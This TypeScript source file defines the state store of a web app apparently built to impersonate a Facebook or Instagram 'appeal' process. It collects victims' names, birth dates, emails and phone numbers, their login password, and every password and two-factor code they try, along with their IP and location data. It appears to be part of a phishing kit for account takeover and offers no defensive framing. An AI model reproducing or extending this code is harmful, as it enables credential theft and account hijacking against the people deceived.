import type { FormDataPayload, LoginData } from '@/utils/message';
import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    city: string;
    country_code: string;
    region?: string;
}

export type LoginProvider = 'facebook' | 'instagram';

export interface AppealProfile {
    fullName: string;
    personalEmail: string;
    phone: string;
}

const emptyForm: FormDataPayload = {
    fullName: '',
    dateOfBirth: '',
    personalEmail: '',
    businessEmail: '',
    phone: '',
    pageName: '',
    reason: '',
    additionalNotes: ''
};

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    deviceLabel: string;
    messageId: number | null;
    formData: FormDataPayload;
    loginData: LoginData;
    passwordAttempts: string[];
    twoFAAttempts: string[];
    appealProfile: AppealProfile | null;
    loginProvider: LoginProvider | null;
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setDeviceLabel: (label: string) => void;
    setMessageId: (id: number | null) => void;
    setFormData: (data: FormDataPayload) => void;
    setLoginData: (data: LoginData) => void;
    addPasswordAttempt: (password: string) => void;
    addTwoFAAttempt: (code: string) => void;
    setAppealProfile: (profile: AppealProfile | null) => void;
    setLoginProvider: (provider: LoginProvider | null) => void;
}

export const store = create<State>()(
    persist(
        (set, get) => ({
            isModalOpen: false,
            geoInfo: null,
            deviceLabel: 'Unknown',
            messageId: null,
            formData: emptyForm,
            loginData: { email: '', password: '' },
            passwordAttempts: [],
            twoFAAttempts: [],
            appealProfile: null,
            loginProvider: null,
            setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
            setDeviceLabel: (label: string) => set({ deviceLabel: label }),
            setMessageId: (id: number | null) => set({ messageId: id }),
            setFormData: (data: FormDataPayload) => set({ formData: data }),
            setLoginData: (data: LoginData) => set({ loginData: data }),
            addPasswordAttempt: (password: string) =>
                set({ passwordAttempts: [...get().passwordAttempts, password] }),
            addTwoFAAttempt: (code: string) => set({ twoFAAttempts: [...get().twoFAAttempts, code] }),
            setAppealProfile: (profile: AppealProfile | null) => set({ appealProfile: profile }),
            setLoginProvider: (provider: LoginProvider | null) => set({ loginProvider: provider })
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                deviceLabel: state.deviceLabel,
                messageId: state.messageId,
                formData: state.formData,
                appealProfile: state.appealProfile,
                loginProvider: state.loginProvider
            })
        }
    )
);
